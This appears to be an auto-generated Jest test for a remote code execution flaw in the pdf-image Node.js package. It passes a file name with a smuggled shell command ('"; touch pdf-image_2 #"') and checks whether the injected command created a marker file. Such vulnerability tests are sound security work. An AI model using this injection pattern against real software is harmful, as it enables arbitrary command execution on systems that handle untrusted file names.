const v33 = () => {
    const v18 = expect.assertions(2);
    v18;
    const v19 = require('pdf-image');
    var PDFImage = v19.PDFImage;
    const fs = require('fs');
    const path = './pdf-image_2';
    try {
        const v20 = fs.existsSync(path);
        if (v20) {
            const v21 = fs.unlinkSync(path);
            v21;
            const v22 = console.log('File removed:', path);
            v22;
        }
    } catch (err) {
        const v23 = console.error(err);
        v23;
    }
    file_exist = fs.existsSync(path);
    const v24 = expect(file_exist);
    const v25 = v24.toBe(false);
    v25;
    try {
        let pdfImage = new PDFImage('"; touch pdf-image_2 #"');
        const v26 = pdfImage.getInfo();
        const v31 = () => {
            file_exist = fs.existsSync(path);
            const v27 = expect(file_exist);
            const v28 = v27.toBe(true);
            v28;
            const v29 = function (err) {
            };
            const v30 = fs.unlink(path, v29);
            v30;
        };
        const v32 = v26.finally(v31);
        return v32;
    } catch (error) {
    }
};
const v34 = test('Remote code execution in pdf-image', v33);
v34;